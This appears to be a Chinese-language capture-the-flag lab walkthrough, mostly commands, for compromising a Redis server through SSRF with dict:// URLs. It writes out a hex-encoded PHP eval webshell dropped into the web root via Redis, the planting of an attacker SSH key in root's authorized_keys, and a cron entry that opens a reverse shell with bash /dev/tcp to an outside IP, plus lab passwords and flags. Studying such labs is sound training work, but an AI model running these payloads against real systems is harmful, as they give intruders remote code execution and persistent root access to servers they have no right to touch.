# 环境
```javascript
1. 密码hello
2. su root 密码 xbw
cd ./redis-2.8.17/src
./redis-server ../redis.conf

如果想redis写公私钥，需要su root
cd /root
mkdir .ssh
```

# 闯关流程
1. [http://192.168.147.130/app1/robots.txt](http://192.168.147.130/app1/robots.txt)![](../../../../images/29b1e1dd75ed7c5c92afafaa0fe94227.png)获得备份文件
2. 下载文件，查看  


```javascript
1.the server port 5562 is running and it's a web application
2.为了避免被黑客攻击，我把服务器的redis端口设置为6378了 把ssh端口 设置为21
```

3. 1  


```javascript
localhost:5562
获得flag1

welcome to PTS Testing
key1:F5Qyixeq

```

4. 1  


```javascript
dict://localhost:6378/flushall
dict://localhost:6378/config:set:dir:/var/www/html/app1
dict://localhost:6378/config:set:dbfilename:hh.php
dict://localhost:6378/set:1:"\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x77\x5d\x29\x3b\x3f\x3e"
dict://localhost:6378/save
找到第二个flag ，webshell密码w
```

注:

    1. 第四步木马，需要进行hex编码，然后每两个字符进行`\x`处理

![](../../../../images/ab2bd5702cd9d4ef8c7abb778a665e3e.png)

5. 1

```javascript
cd /var/spool/cron   找到第三个flag
```

![](../../../../images/c3d152e6ae08b95b9003c39a45309636.png)

# 使用公私钥
本地没有ssh公私钥的ssh-keygen -t rsa用这个生成

```javascript
nc 192.168.147.130 6378
ping 
flushall
config set dir /root/.ssh/
config  set dbfilename authorized_keys
set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJpLaHb+Qqzugsui0PT+5lbH70vAva31UVVc2H9wQcqZHcbM+Io18KVQgVXaMrckwE1c7H6CQK4vWSlBwLKQx82LMWtAak1A2blzpfampKw5jHMTUI8cttIDhslR/cbLV0c2lRQTwxsoOC20g5zIA5iTjRw/9nisPFkRdEAg/Hi9pmyepZQFQM9HVhpRtLuHbovQEwneQr/4l4gOU6gaSiQGSpaJaOAiAxbFSN/A5xcJLwHeINjuQZrtgNr5kF8Mk56avjLUA9oK8i1GTRUqqMiVygilz0tTBdc9MwsL2rSkFV44xv5qQQvmKOj/oZHAEj//CAIPoxj33pGJ4RL2B5C38FQeYY2AIWUi4FIHZWnKT7s/7QK6fdyNUqA2g28Dmn49kVOBYm7evMFA38g4cwFC2kRUCE9ZYIIL8VIxo7fQFT286quTGmmCsZCQshcN82tzzo69xAz6lKtLJ2CMWP3dI7ezfcVzl83n3tb9MAWUpzVnmbxph/dmQWvVoGd+c= root@kali\n\n\n"
save
```

ssh root@192.168.0.75

# 航空公司
ssrf+redis+文件包含(tp6.0.12)  
![](../../../../images/de2e8f8e4a09f66a1e417eb38db35cf8.png)

![](../../../../images/401c88decd66bf2b40073fa9b79d1256.png)

```plain
config:set:dir:/var/spool/cron
config:set:dbfilename:root
set:ziye2:"\n\n* * * * * bash -i>& /dev/tcp/45.32.19.190/4545 0>&1\n\n"
save

```

[https://www.cnblogs.com/xiaozi/p/13089906.html](https://www.cnblogs.com/xiaozi/p/13089906.html)

